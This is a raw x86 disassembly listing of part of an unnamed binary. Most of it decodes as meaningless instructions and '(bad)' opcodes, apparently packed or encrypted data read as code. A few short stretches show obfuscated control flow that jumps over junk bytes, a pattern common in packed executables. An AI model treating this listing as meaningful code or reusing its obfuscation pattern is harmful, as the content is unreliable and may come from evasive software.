  41ca7f:	sbb    eax,0xc1749c45
  41ca84:	mov    ebx,0xbbbbbfa8
  41ca89:	loope  0x41ca8d
  41ca8b:	xor    eax,0x20fb010b
  41ca90:	arpl   WORD PTR [edx-0x20],dx
  41ca93:	retf   
  41ca94:	arpl   WORD PTR [ecx+0x6f5b2f35],bp
  41ca9a:	aaa    
  41ca9b:	and    BYTE PTR [ecx],bh
  41ca9d:	push   ebx
  41ca9e:	xchg   esi,eax
  41ca9f:	mov    ch,0x44
  41caa1:	dec    edi
  41caa2:	gs adc eax,0x1338f659
  41caa8:	retf   
  41caa9:	adc    eax,0x69b924ae
  41caae:	xchg   edi,eax
  41caaf:	popf   
  41cab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cab1:	leave  
  41cab2:	mov    esp,0x6dc12b14
  41cab7:	std    
  41cab8:	add    ebx,DWORD PTR [ebx-0x41]
  41cabb:	jle    0x41cabb
  41cabd:	push   ecx
  41cabe:	int    0xb9
  41cac0:	test   DWORD PTR [ebx+0x2f],edi
  41cac3:	sbb    al,0x8f
  41cac5:	or     eax,0x23be76b9
  41caca:	pop    es
  41cacb:	ror    edi,1
  41cacd:	jge    0x41cac7
  41cacf:	pusha  
  41cad0:	iret   
  41cad1:	mov    al,0xe3
  41cad3:	mov    eax,ds:0x985d45c1
  41cad8:	sub    eax,0xc1c3a156
  41cadd:	mov    ecx,0x2194b5ff
  41cae2:	lock add edi,DWORD PTR [ecx+0x152208f7]
  41cae9:	js     0x41cb08
  41caeb:	bound  esp,QWORD PTR [esi]
  41caed:	ss clc 
  41caef:	out    dx,eax
  41caf0:	std    
  41caf1:	mov    edi,0x1c2ab549
  41caf6:	xlat   BYTE PTR ds:[ebx]
  41caf7:	fimul  WORD PTR [edi]
  41caf9:	sbb    DWORD PTR [ebx+ecx*1+0x188dd99e],ebx
  41cb00:	ret    0x3067
  41cb03:	out    dx,al
  41cb04:	call   0x41b7:0x6c1b3863
  41cb0b:	mov    ebx,0x23239761
  41cb10:	fistp  DWORD PTR ds:0x1370d0b5
  41cb16:	adc    edx,ebp
  41cb18:	push   esi
  41cb19:	or     edx,DWORD PTR [edi]
  41cb1b:	ins    DWORD PTR es:[edi],dx
  41cb1c:	int    0xc6
  41cb1e:	jecxz  0x41cb1b
  41cb20:	daa    
  41cb21:	fs sub al,0x59
  41cb24:	paddsw mm1,QWORD PTR [esi+0x1977b06f]
  41cb2b:	scas   eax,DWORD PTR es:[edi]
  41cb2c:	imul   eax,esi,0xf1a379ff
  41cb32:	push   ecx
  41cb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb34:	sbb    dl,bl
  41cb36:	cmp    BYTE PTR [edi+0x3e64cf7f],0x6b
  41cb3d:	cmp    DWORD PTR [esi],0x69
  41cb40:	jle    0x41caf1
  41cb42:	das    
  41cb43:	cli    
  41cb44:	mov    esp,0x6838fd06
  41cb49:	mov    al,ds:0x54fcf187
  41cb4e:	(bad)  
  41cb4f:	imul   ecx,DWORD PTR [ebp+eax*2+0x59e288d2],0x78
  41cb57:	fldcw  WORD PTR [ecx]
  41cb5a:	test   BYTE PTR ds:0xea4f0108,cl
  41cb60:	loopne 0x41cb00
  41cb62:	xor    ebx,esp
  41cb64:	sbb    al,0x22
  41cb66:	sti    
  41cb67:	cdq    
  41cb68:	xor    eax,0x74fc3e0b
  41cb6d:	jb     0x41cb94
  41cb6f:	es sbb al,0x1d
  41cb72:	into   
  41cb73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb74:	mov    eax,0x9b63b8a0
  41cb79:	mov    al,0x31
  41cb7b:	cmp    eax,0x6af5ff8c
  41cb80:	test   DWORD PTR [edi+0x4952a6a2],edi
  41cb86:	xchg   DWORD PTR [eax-0x6331df7e],edx
  41cb8c:	fisttp WORD PTR [edi+0x6331612b]
  41cb92:	mov    esi,0xb5695916
  41cb97:	cmp    cl,BYTE PTR [esi+0x30]
  41cb9a:	dec    edx
  41cb9b:	in     eax,dx
  41cb9c:	data16 sti 
  41cb9e:	lds    edx,FWORD PTR [edi+0x77bc10d0]
  41cba4:	pop    eax
  41cba5:	les    edi,FWORD PTR [eax-0x5d77e1fb]
  41cbab:	xor    eax,0x7b2b974a
  41cbb0:	jg     0x41cb4d
  41cbb2:	iret   
  41cbb3:	ror    BYTE PTR [ebx],1
  41cbb5:	pop    eax
  41cbb6:	and    BYTE PTR [esi+0x63],cl
  41cbb9:	pop    edx
  41cbba:	aam    0x5e
  41cbbc:	call   0x2ca6:0x9af721bc
  41cbc3:	fstp   DWORD PTR [edx]
  41cbc5:	xor    dl,bl
  41cbc7:	jbe    0x41cbbe
  41cbc9:	stc    
  41cbca:	ja     0x41cb83
  41cbcc:	cmp    ch,BYTE PTR [esp+eiz*4-0x18]
  41cbd0:	sub    BYTE PTR [ebp+0x6e21d6a5],0x22
  41cbd7:	or     DWORD PTR [esi],ecx
  41cbd9:	nop
  41cbda:	add    eax,0xced6bb6f
  41cbdf:	ja     0x41cc02
  41cbe1:	pusha  
  41cbe2:	scas   eax,DWORD PTR es:[edi]
  41cbe3:	and    DWORD PTR [ebx-0x18],0xadd89189
  41cbea:	xchg   eax,eax
  41cbec:	dec    ecx
  41cbed:	popf   
  41cbee:	not    dh
  41cbf0:	mov    ds:0x67c21ea1,al
  41cbf5:	call   0xc265:0x1cb629e2
  41cbfc:	pop    eax
  41cbfd:	dec    ebx
  41cbfe:	inc    esi
  41cbff:	in     al,dx
  41cc00:	xchg   edx,eax
  41cc01:	pushf  
  41cc02:	jge    0x41cc2d
  41cc04:	lea    edx,[ebx+0x7d]
  41cc07:	or     BYTE PTR ss:[esp+eiz*2-0x3f],ch
  41cc0c:	jne    0x41cc3b
  41cc0e:	push   edx
  41cc0f:	adc    dl,ch
  41cc11:	std    
  41cc12:	imul   DWORD PTR [ebx-0xec11f72]
  41cc18:	(bad)  
  41cc19:	fsubp  st(6),st
  41cc1b:	add    al,0xdb
  41cc1d:	and    BYTE PTR [edx+0x78aec8d7],dh
  41cc23:	outs   dx,BYTE PTR ds:[esi]
  41cc24:	ficom  DWORD PTR [edx-0x581773a5]
  41cc2a:	(bad)  
  41cc2b:	xor    esi,edx
  41cc2d:	add    eax,0xf05b9205
  41cc32:	ds xchg edx,eax
  41cc34:	in     al,0xa5
  41cc36:	fwait
  41cc37:	jp     0x41cc10
  41cc39:	stos   DWORD PTR es:[edi],eax
  41cc3a:	mov    ds:0x2704bf01,eax
  41cc3f:	xor    DWORD PTR [ebx+0x5c],edx
  41cc42:	sbb    cl,BYTE PTR [edx-0x21]
  41cc45:	push   ecx
  41cc46:	sub    al,0xbf
  41cc48:	or     ebx,DWORD PTR [edi-0x1cb05bc0]
  41cc4e:	adc    eax,0xaa1075e6
  41cc53:	push   edx
  41cc54:	mov    WORD PTR [eax+0x51849643],ss
  41cc5a:	mov    ecx,0xee29db8e
  41cc5f:	inc    ebx
  41cc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc61:	daa    
  41cc62:	adc    ah,BYTE PTR [ebp+0x57]
  41cc65:	rcl    DWORD PTR [esi+eax*4+0x4e14961e],1
  41cc6c:	int3   
  41cc6d:	sub    BYTE PTR [ebx-0x5],0x82
  41cc71:	out    0x25,al
  41cc73:	inc    esp
  41cc74:	fcom   DWORD PTR [esi+0x79e400ee]
  41cc7a:	jp     0x41cc5f
  41cc7c:	sti    
  41cc7d:	fisttp WORD PTR [edi+esi*8]
  41cc80:	repz retf 0x89f9
  41cc84:	xchg   edi,eax
  41cc85:	hlt    
  41cc86:	out    0x4c,eax
  41cc88:	xor    DWORD PTR [ecx+esi*1-0x7f976f6e],ebp
  41cc8f:	jmp    0xcc09:0xc61bea9
  41cc96:	inc    eax
  41cc97:	dec    ebx
  41cc98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc99:	inc    ebp
  41cc9a:	add    al,0xb2
  41cc9c:	mov    al,ds:0x484ef59f
  41cca1:	and    dh,dh
  41cca3:	(bad)
  41cca7:	retf   0x2df8
  41ccaa:	cmp    DWORD PTR [ebx],edx
  41ccac:	and    eax,0x8a88148d
  41ccb1:	cmp    WORD PTR [ecx],bx
  41ccb4:	inc    esp
  41ccb5:	push   edi
  41ccb6:	scas   al,BYTE PTR es:[edi]
  41ccb7:	stos   BYTE PTR es:[edi],al
  41ccb8:	fdiv   QWORD PTR [ebx+0x3e9906e6]
  41ccbe:	lods   eax,DWORD PTR ds:[esi]
  41ccbf:	fcmovnbe st,st(0)
  41ccc1:	inc    edi
  41ccc2:	sbb    eax,DWORD PTR [ebp+0x63]
  41ccc5:	fstp   QWORD PTR [ecx]
  41ccc7:	in     eax,dx
  41ccc8:	pop    eax
  41ccc9:	mov    al,ds:0xb6411c17
  41ccce:	dec    ebx
  41cccf:	adc    BYTE PTR [edi+0x19],al
  41ccd2:	les    ebp,FWORD PTR [eax+eiz*2-0x801bdb5]
  41ccd9:	fmulp  st(4),st
  41ccdb:	les    ebp,FWORD PTR ds:0xfeaeb55b
  41cce1:	mov    ecx,0x827786e6
  41cce6:	mov    eax,ds:0xd72c9c1f
  41cceb:	(bad)  
  41ccec:	imul   eax
  41ccee:	and    ebp,DWORD PTR [eax+edx*1]
  41ccf1:	push   ecx
  41ccf2:	add    al,0x9c
  41ccf4:	(bad)  
  41ccf5:	test   eax,0xb1fccebc
  41ccfa:	push   0x83d59cf9
  41ccff:	ins    BYTE PTR es:[edi],dx
  41cd00:	and    DWORD PTR [edx+0x5c0d8b66],esi
  41cd06:	daa    
  41cd07:	inc    edx
  41cd08:	add    BYTE PTR [esi+0xb],ah
  41cd0b:	enter  0xa166,0x58
  41cd0f:	daa    
  41cd10:	inc    edx
  41cd11:	add    BYTE PTR [esi+0xf],ah
  41cd14:	scas   eax,DWORD PTR es:[edi]
  41cd15:	sar    DWORD PTR [ecx+0x301a],0x66
  41cd1c:	xor    eax,ecx
  41cd1e:	mov    cx,WORD PTR [esp+0x20]
  41cd23:	cmp    cx,ax
  41cd26:	jbe    0x41cd76
  41cd2c:	lea    eax,[esp+0x54]
  41cd30:	push   eax
  41cd31:	lea    eax,[esp+0x50]
  41cd35:	push   eax
  41cd36:	call   0x40a1aa
  41cd3b:	cmp    eax,ebx
  41cd3d:	jne    0x41cd76
  41cd43:	cmp    edx,esi
  41cd45:	jne    0x41cd76
  41cd4b:	jmp    0x4193d4
  41cd50:	mov    eax,DWORD PTR [esp+0x60]
  41cd54:	mov    ecx,DWORD PTR [esp+0x64]
  41cd58:	mov    edx,DWORD PTR [esp+0x58]
  41cd5c:	mov    edi,DWORD PTR [esp+0x5c]
  41cd60:	add    eax,edx
  41cd62:	adc    ecx,edi
  41cd64:	mov    DWORD PTR [esp+0x58],eax
  41cd68:	mov    DWORD PTR [esp+0x5c],ecx
  41cd6c:	jmp    0x41cd76
  41cd71:	mov    ebx,0xcb89b676
  41cd76:	push   0x4
  41cd78:	push   0x4222a8
  41cd7d:	lea    eax,[esp+0x44]
  41cd81:	push   eax
  41cd82:	call   0x41182a
  41cd87:	mov    eax,DWORD PTR [esp+0x3c]
  41cd8b:	push   0x4
  41cd8d:	push   DWORD PTR [eax+0x1a4]
  41cd93:	lea    eax,[esp+0x4c]
  41cd97:	push   eax
  41cd98:	call   0x41182a
  41cd9d:	mov    eax,DWORD PTR [esp+0x3c]
  41cda1:	mov    eax,DWORD PTR [eax+0x1a4]
  41cda7:	mov    eax,DWORD PTR [eax]
  41cda9:	mov    ecx,DWORD PTR [esp+0x3c]
  41cdad:	mov    eax,DWORD PTR [eax+0x3c]
  41cdb0:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41cdb6:	mov    ecx,DWORD PTR [ecx]
  41cdb8:	lea    eax,[ecx+eax*1+0x28]
  41cdbc:	mov    eax,DWORD PTR [eax]
  41cdbe:	add    DWORD PTR [esp+0x44],eax
  41cdc2:	mov    DWORD PTR [esp+0x18],0x127
  41cdca:	mov    DWORD PTR [esp+0x20],0x421a
  41cdd2:	mov    eax,DWORD PTR [esp+0x20]
  41cdd6:	and    eax,0xffffc244
  41cddb:	add    eax,DWORD PTR [esp+0x18]
  41cddf:	and    eax,0xfffffe5a
  41cde4:	sub    eax,0x2ae1
  41cde9:	and    eax,0x6f90
  41cdee:	mov    DWORD PTR [esp+0x18],eax
  41cdf2:	mov    DWORD PTR [esp+0x20],0x1515
  41cdfa:	mov    eax,DWORD PTR [esp+0x20]
  41cdfe:	jmp    0x41d094
  41ce03:	inc    esp
  41ce04:	cli    
  41ce05:	add    BYTE PTR [ebx-0x7c],ch
  41ce08:	jno    0x41cdbf
  41ce0a:	xor    eax,0x2ff32380
  41ce0f:	fild   QWORD PTR gs:[ecx+0x45]
  41ce13:	cmp    DWORD PTR [eax-0x3f],0xffffffbb
  41ce17:	test   al,0xbf
  41ce19:	mov    ebx,0x5e6581bb
  41ce1e:	adc    DWORD PTR [esi+esi*1+0x28],edx
  41ce22:	outs   dx,BYTE PTR ds:[esi]
  41ce23:	jge    0x41ce7e
  41ce25:	push   ss
  41ce26:	das    
  41ce27:	les    esp,FWORD PTR [edx-0x3a]
  41ce2a:	mov    eax,0xc95a3d70
  41ce2f:	inc    edi
  41ce30:	sti    
  41ce31:	jne    0x41ce9d
  41ce33:	dec    eax
  41ce34:	inc    ecx
  41ce35:	and    DWORD PTR [edi+ecx*2-0x36],eax
  41ce39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3a:	jmp    0x80cb:0x8c842981
  41ce41:	adc    BYTE PTR [edx],dh
  41ce43:	add    BYTE PTR [edi-0x57],dh
  41ce46:	or     edi,DWORD PTR [ebp+0x28]
  41ce49:	retf   
  41ce4a:	call   0x4898:0x5cf59124
  41ce51:	sar    DWORD PTR [eax],cl
  41ce53:	outs   dx,DWORD PTR ds:[esi]
  41ce54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce55:	pushf  
  41ce56:	fidiv  WORD PTR [eax+0x3c]
  41ce59:	inc    esi
  41ce5a:	into   
  41ce5b:	mov    edx,0xa415c656
  41ce60:	xchg   esi,eax
  41ce61:	loop   0x41ce10
  41ce63:	sub    bh,al
  41ce65:	mov    esp,DWORD PTR [esi+ebx*4]
  41ce68:	cmc    
  41ce69:	loopne 0x41ce2e
  41ce6b:	mov    ecx,0x7b54dfcd
  41ce70:	repz scas al,BYTE PTR es:[edi]
  41ce72:	into   
  41ce73:	cmp    bl,BYTE PTR [ebx+0x72dabe8b]
  41ce79:	push   esi
  41ce7a:	out    dx,eax
  41ce7b:	test   eax,0x5edda1ae
  41ce80:	add    al,0xbb
  41ce82:	sahf   
  41ce83:	mov    edi,DWORD PTR [ebx-0x71]
  41ce86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce87:	pop    esp
  41ce88:	xchg   esi,eax
  41ce89:	mov    eax,0xa6b709e8
  41ce8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce8f:	xchg   ebx,eax
  41ce90:	and    eax,0x38f8b587
  41ce95:	(bad)  
  41ce96:	cmp    ecx,edi
  41ce98:	lds    ebp,FWORD PTR [edx+0x55]
  41ce9b:	xchg   ecx,eax
  41ce9c:	in     eax,0xef
  41ce9e:	(bad)  
  41ce9f:	xchg   ecx,eax
  41cea0:	bound  esp,QWORD PTR [edx-0x3]
  41cea3:	out    0x43,eax
  41cea5:	jnp    0x41ce94
  41cea7:	pop    ss
  41cea8:	mov    WORD PTR [esi],cs
  41ceaa:	pop    ecx
  41ceab:	cmp    al,0x4c
  41cead:	mov    bl,0x76
  41ceaf:	fcmovnu st,st(5)
  41ceb1:	test   BYTE PTR [esi-0x27d88ef5],bl
  41ceb7:	jb     0x41ced4
  41ceb9:	cmp    eax,0x19069d0a
  41cebe:	mov    dh,0xa7
  41cec0:	sub    BYTE PTR [ecx],0x79
  41cec3:	inc    esi
  41cec4:	adc    edx,DWORD PTR [esi-0x25]
  41cec7:	pop    edi
  41cec8:	cli    
  41cec9:	dec    edi
  41ceca:	mov    ch,0x3e
  41cecc:	and    BYTE PTR [edi+edx*2],dh
  41cecf:	fsub   st,st(3)
  41ced1:	rcr    ch,cl
  41ced3:	lock les edx,FWORD PTR ds:0xb7a7b18e
  41ceda:	push   ecx
  41cedb:	ret    
  41cedc:	in     al,0x1c
  41cede:	mov    ch,0x42
  41cee0:	inc    ebp
  41cee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee2:	mov    BYTE PTR [eax+0x77],bl
  41cee5:	add    dh,cl
  41cee7:	sub    edi,DWORD PTR [edx+0x6d]
  41ceea:	ret    0xaaef
  41ceed:	jecxz  0x41cf5c
  41ceef:	jge    0x41cf5c
  41cef1:	dec    edi
  41cef2:	adc    eax,0x113b7505
  41cef7:	or     esi,esp
  41cef9:	push   ecx
  41cefa:	ss (bad) 
  41cefc:	arpl   WORD PTR [edi+ebp*8+0x17],sp
  41cf00:	sbb    edi,DWORD PTR [esi-0x2787b3cf]
  41cf06:	push   edi
  41cf07:	int    0x46
  41cf09:	or     BYTE PTR [edi+0x7d],dl
  41cf0c:	mov    BYTE PTR [edx],al
  41cf0e:	fisttp WORD PTR [eax+0x6]
  41cf11:	mov    bl,0x58
  41cf13:	shl    DWORD PTR [ebx-0x7a1996a3],1
  41cf19:	mov    eax,ds:0xeb0ee1c3
  41cf1e:	(bad)  
  41cf1f:	jnp    0x41cf19
  41cf21:	scas   eax,DWORD PTR es:[edi]
  41cf22:	mov    al,ds:0x309c78ff
  41cf27:	shr    DWORD PTR [ebx-0x32ff7f94],0x60
  41cf2e:	fistp  QWORD PTR [ebx+eax*2+0x4d]
  41cf32:	popa   
  41cf33:	adc    ch,0x13
  41cf36:	adc    al,0xf9
  41cf38:	adc    al,0xc6
  41cf3a:	gs mov esp,0x9fe20869
  41cf40:	xchg   esi,eax
  41cf41:	and    DWORD PTR [edi+0x611d8fca],ecx
  41cf47:	xor    eax,0x4297e05a
  41cf4c:	mov    bl,0x3c
  41cf4e:	je     0x41cef6
  41cf50:	xor    dl,BYTE PTR [edi+0x504d23fb]
  41cf56:	pop    esp
  41cf57:	adc    al,0x5f
  41cf59:	lahf   
  41cf5a:	push   edi
  41cf5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf5c:	or     eax,DWORD PTR [ecx]
  41cf5e:	dec    edx
  41cf5f:	sbb    eax,0xab003359
  41cf64:	inc    edx
  41cf65:	not    DWORD PTR [edx+0x3c]
  41cf68:	jo     0x41cf30
  41cf6a:	inc    ecx
  41cf6b:	in     eax,dx
  41cf6c:	xchg   ebx,eax
  41cf6d:	xlat   BYTE PTR ds:[ebx]
  41cf6e:	rcr    esp,0x8d
  41cf71:	and    BYTE PTR [ebp+0x4f08faac],al
  41cf77:	pop    ss
  41cf78:	test   eax,0x62616e3b
  41cf7d:	cmc    
  41cf7e:	daa    
  41cf7f:	push   ecx
  41cf80:	outs   dx,BYTE PTR ds:[esi]
  41cf81:	jmp    0x7c2c0583
  41cf86:	adc    BYTE PTR [edx],bl
  41cf88:	fild   DWORD PTR [esi+0x38]
  41cf8b:	inc    esp
  41cf8c:	fldenv [edx-0x25]
  41cf8f:	pushf  
  41cf90:	into   
  41cf91:	mov    ds:0x6bc9fdb,al
  41cf96:	xor    al,0x41
  41cf98:	les    eax,FWORD PTR [edx+ebx*8]
  41cf9b:	push   ebp
  41cf9c:	cwde   
  41cf9d:	jnp    0x41d014
  41cf9f:	test   BYTE PTR [edi+edx*2+0x34],ah
  41cfa3:	bound  ebp,QWORD PTR [eax+ebx*8-0x67]
  41cfa7:	sub    eax,0x6b276e53
  41cfac:	ins    BYTE PTR es:[edi],dx
  41cfad:	mov    ah,0x31
  41cfaf:	loopne 0x41cf7b
  41cfb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfb2:	pop    ebx
  41cfb3:	ret    
  41cfb4:	fbstp  TBYTE PTR [esi+edi*8-0x63a91259]
  41cfbb:	pop    ss
  41cfbc:	or     eax,0x4cfe9566
  41cfc1:	push   esp
  41cfc2:	jg     0x41cfbe
  41cfc4:	(bad)  
  41cfc5:	repnz outs dx,DWORD PTR ds:[esi]
  41cfc7:	xchg   ebp,eax
  41cfc8:	aam    0x9a
  41cfca:	mov    ds:0x204cac24,al
  41cfcf:	jnp    0x41cfdf
  41cfd1:	inc    ebx
  41cfd2:	mov    edi,DWORD PTR [edx]
  41cfd4:	pop    esp
  41cfd5:	(bad)  
  41cfd6:	and    BYTE PTR [esi],0xcc
  41cfd9:	xchg   ebp,eax
  41cfda:	mov    ebx,0xcfefbb76
  41cfdf:	icebp  
  41cfe0:	mov    ds:0xeeaeb04b,eax
  41cfe5:	test   BYTE PTR [eax+edi*4-0x74ff55d6],bh
  41cfec:	inc    edi
  41cfed:	ror    BYTE PTR [eax-0x7ab22723],1
  41cff3:	stos   BYTE PTR es:[edi],al
  41cff4:	add    eax,0x8f9153a0
  41cff9:	popa   
  41cffa:	pop    ss
  41cffb:	stos   BYTE PTR es:[edi],al
  41cffc:	or     al,0x93
  41cffe:	mov    dl,0xdc
  41d000:	shr    BYTE PTR [edi],cl
  41d002:	das    
  41d003:	outs   dx,BYTE PTR ds:[esi]
  41d004:	fcomp  DWORD PTR [edx+0x1527141e]
  41d00a:	adc    eax,0x1801808d
  41d00f:	clc    
  41d010:	push   ebp
  41d011:	push   ss
  41d012:	(bad)  
  41d013:	psubw  mm1,QWORD PTR [ebx]
  41d016:	loopne 0x41cff6
  41d018:	shl    bh,1
  41d01a:	out    dx,eax
  41d01b:	test   DWORD PTR [ebx-0x2fcbae1d],edx
  41d021:	inc    ebx
  41d022:	mov    ?,WORD PTR [ebx]
  41d024:	nop
  41d025:	ret    0x7cc6
  41d028:	jbe    0x41d077
  41d02a:	in     eax,dx
  41d02b:	mov    dh,0x26
  41d02d:	lods   eax,DWORD PTR ds:[esi]
  41d02e:	rol    DWORD PTR [esi-0x3d],cl
  41d031:	fiadd  DWORD PTR gs:[esi-0x7d]
  41d035:	data16 stc 
  41d037:	push   ebx
  41d038:	mov    esp,0x4305377f
  41d03d:	pop    es
  41d03e:	scas   al,BYTE PTR es:[edi]
  41d03f:	push   eax
  41d040:	mov    eax,0xc62b7922
  41d045:	inc    eax
  41d046:	shr    BYTE PTR [ecx+0x2b],1
  41d049:	mov    cl,0x21
  41d04b:	pop    ebx
  41d04c:	imul   edx,DWORD PTR [edx],0xffffff91
  41d04f:	and    eax,0xe032a402
  41d054:	jne    0x41cfee
  41d056:	push   ds
  41d057:	push   eax
  41d058:	aad    0x53
  41d05a:	and    esi,DWORD PTR [eax+0x5bbd4d7]
  41d060:	or     BYTE PTR gs:[esi],al
  41d063:	and    BYTE PTR [ebx-0x2372fe10],al
  41d069:	inc    eax
  41d06a:	mov    ch,0x62
  41d06c:	jle    0x41d07c
  41d06e:	call   0x35c6f0bd
  41d073:	xchg   edx,eax
  41d074:	push   ebx
  41d075:	add    bh,BYTE PTR [ecx-0x7058b7f0]
  41d07b:	push   eax
  41d07c:	mov    edi,0xc5be0e6
  41d081:	out    dx,eax
  41d082:	dec    ecx
  41d083:	sub    ebx,DWORD PTR [ebp+0x5a15bd4a]
  41d089:	add    eax,0x1bbdd34f
  41d08e:	in     eax,dx
  41d08f:	ret    0xb648
  41d092:	jl     0x41d0d7
  41d094:	mov    ecx,DWORD PTR [esp+0x18]
  41d098:	or     eax,0x7113
  41d09d:	add    eax,0x3d6a
  41d0a2:	cmp    ecx,eax
  41d0a4:	je     0x41d427
  41d0aa:	mov    eax,DWORD PTR [esp+0x2c]
  41d0ae:	mov    edx,DWORD PTR [esp+0x58]
  41d0b2:	mov    edi,DWORD PTR [esp+0x5c]
  41d0b6:	xor    ecx,ecx
  41d0b8:	shld   ecx,eax,0x2
  41d0bc:	shl    eax,0x2
  41d0bf:	jmp    0x41d355
  41d0c4:	mov    ds:0x95d2803c,eax
  41d0c9:	ja     0x41d084
  41d0cb:	mov    esp,0x3151457a
  41d0d0:	mov    ch,0x40
  41d0d2:	push   ecx
  41d0d3:	xor    DWORD PTR [eax+0x7a],esi
  41d0d6:	sar    DWORD PTR [ebx-0x44444058],0x3a
  41d0dd:	std    
  41d0de:	add    al,0x40
  41d0e0:	cli    
  41d0e1:	dec    ebp
  41d0e2:	int    0x4
  41d0e4:	cmp    BYTE PTR [esi-0x33],cl
  41d0e7:	add    eax,0x55a8ab8
  41d0ec:	shr    BYTE PTR [edx],cl
  41d0ee:	sbb    al,0x86
  41d0f0:	cmp    dl,bl
  41d0f2:	lahf   
  41d0f3:	push   esp
  41d0f4:	ins    BYTE PTR es:[edi],dx
  41d0f5:	in     eax,dx
  41d0f6:	dec    ebx
  41d0f7:	push   0xffffff99
  41d0f9:	pop    ecx
  41d0fa:	lahf   
  41d0fb:	je     0x41d0ba
  41d0fd:	pop    esp
  41d0fe:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41d100:	or     BYTE PTR [ecx-0xa73b7d7],dl
  41d106:	jmp    0xcfc0656a
  41d10b:	aaa    
  41d10c:	stc    
  41d10d:	repnz repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d110:	out    dx,eax
  41d111:	lock loope 0x41d166
  41d114:	pop    esi
  41d115:	call   0x26f4c656
  41d11a:	fs add ebp,0xffffffc8
  41d11e:	dec    esp
  41d11f:	xchg   DWORD PTR [ebp+eax*1+0x72],edi
  41d123:	mov    ah,0x53
  41d125:	mov    edx,0x4b0f0fe9
  41d12a:	adc    esi,edx
  41d12c:	sahf   
  41d12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d12e:	addr16 leave 
  41d130:	jmp    0x41d0f9
  41d132:	cmc    
  41d133:	push   ebp
  41d134:	ins    BYTE PTR es:[edi],dx
  41d135:	aaa    
  41d136:	pusha  
  41d137:	loop   0x41d17f
  41d139:	xchg   BYTE PTR [edx],dh
  41d13b:	ret    
  41d13c:	xchg   esi,eax
  41d13d:	cmp    esp,DWORD PTR [esi-0x567b1021]
  41d143:	cdq    
  41d144:	inc    edi
  41d145:	cmp    eax,0x974b9611
  41d14a:	(bad)  [ebp-0x28a7c9f8]
  41d150:	sub    eax,DWORD PTR [eax+0x5f10fec5]
  41d156:	dec    ecx
  41d157:	jne    0x41d149
  41d159:	pop    ebp
  41d15a:	pop    edx
  41d15b:	add    DWORD PTR [eax],ebx
  41d15d:	sbb    al,0x73
  41d15f:	test   DWORD PTR [esi+0x52],edi
  41d162:	ss (bad) 
  41d164:	mov    esi,0xa1760a62
  41d169:	stc    
  41d16a:	(bad)  
  41d16b:	ret    0xf98c
  41d16e:	pop    ss
  41d16f:	mov    eax,0x2e6ff06c
  41d174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d175:	imul   edi,DWORD PTR [ebp+0x56],0xd905d226
  41d17c:	ss stos DWORD PTR es:[edi],eax
  41d17e:	enter  0xfa18,0xb0
  41d182:	rcl    BYTE PTR [eax],0xc6
  41d185:	dec    edx
  41d186:	repnz aaa 
  41d188:	push   esi
  41d189:	loope  0x41d14e
  41d18b:	push   edi
  41d18c:	sbb    al,0x81
  41d18e:	xchg   BYTE PTR [eax],cl
  41d190:	ficom  DWORD PTR ds:0xf6186f26
  41d196:	inc    eax
  41d197:	mov    edx,0x6abef733
  41d19c:	xchg   esp,eax
  41d19d:	jo     0x41d174
  41d19f:	(bad)  
  41d1a0:	lahf   
  41d1a1:	aad    0xf8
  41d1a3:	enter  0x43b3,0xb
  41d1a7:	push   0x28
  41d1a9:	and    al,0xc6
  41d1ab:	xor    DWORD PTR [edi],ecx
  41d1ad:	out    0xd3,al
  41d1af:	daa    
  41d1b0:	adc    DWORD PTR ds:0xc311f540,ecx
  41d1b6:	and    cl,BYTE PTR [ebp+eiz*2-0x64086149]
  41d1bd:	pop    edx
  41d1be:	xchg   esi,eax
  41d1bf:	emms   
  41d1c1:	mov    ebp,0xdcb1630d
  41d1c6:	mov    BYTE PTR [eax+0x13093d91],bl
  41d1cc:	loopne 0x41d15d
  41d1ce:	ret    
  41d1cf:	dec    ah
  41d1d1:	ficomp DWORD PTR [esi+ebp*1+0x48]
  41d1d5:	ds test eax,0xb076f100
  41d1db:	hlt    
  41d1dc:	fwait
  41d1dd:	js     0x41d259
  41d1df:	stc    
  41d1e0:	or     eax,0x27d5b33d
  41d1e5:	mov    bh,0xbf
  41d1e7:	lock inc ebx
  41d1e9:	enter  0x567b,0x5c
  41d1ed:	fpatan 
  41d1ef:	adc    BYTE PTR [ebx+0x10],0xdd
  41d1f3:	ins    BYTE PTR es:[edi],dx
  41d1f4:	mov    cl,0x4
  41d1f6:	call   0x88b10b6
  41d1fb:	pop    esp
  41d1fc:	shl    ecx,cl
  41d1fe:	dec    eax
  41d1ff:	out    dx,eax
  41d200:	push   es
  41d201:	sub    edi,DWORD PTR [ecx+0x5a]
  41d204:	out    0xee,eax
  41d206:	sub    eax,0xa077d1d0
  41d20b:	xchg   esi,eax
  41d20c:	mov    ch,BYTE PTR [edx]
  41d20e:	adc    eax,0xa6daef0f
  41d213:	sub    eax,0x3e0a79f3
  41d218:	stos   DWORD PTR es:[edi],eax
  41d219:	iret   
  41d21a:	push   es
  41d21b:	dec    esi
  41d21c:	sub    BYTE PTR [ebp+eiz*2-0x770f6159],bh
  41d223:	scas   eax,DWORD PTR es:[edi]
  41d224:	frstor [ebp+0x2f]
  41d227:	adc    al,0x74
  41d229:	push   ds
  41d22a:	inc    ecx
  41d22b:	and    BYTE PTR [edi-0x34],0xad
  41d22f:	fst    DWORD PTR ds:0x9be75c39
  41d235:	mov    ebx,0x71122373
  41d23a:	inc    edi
  41d23b:	shr    edx,cl
